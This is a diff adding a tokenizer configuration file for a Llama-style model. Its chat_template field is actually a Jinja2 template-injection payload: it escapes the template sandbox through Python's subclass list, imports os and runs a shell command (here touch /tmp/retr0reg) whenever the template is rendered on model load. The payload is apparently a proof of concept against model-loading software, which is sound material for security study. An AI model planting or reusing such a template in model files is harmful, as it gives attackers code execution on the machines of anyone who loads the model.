@@ -1,0 +1,7 @@
+{
+  "tokenizer_class": "LlamaTokenizer",
+  "model_max_length": 4096,
+  "chat_template": "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c()._module.__builtins__['__import__']('os').system('touch /tmp/retr0reg') }}{% endif %}{% endfor %}",
+  "bos_token": "<s>",
+  "eos_token": "</s>"
+}
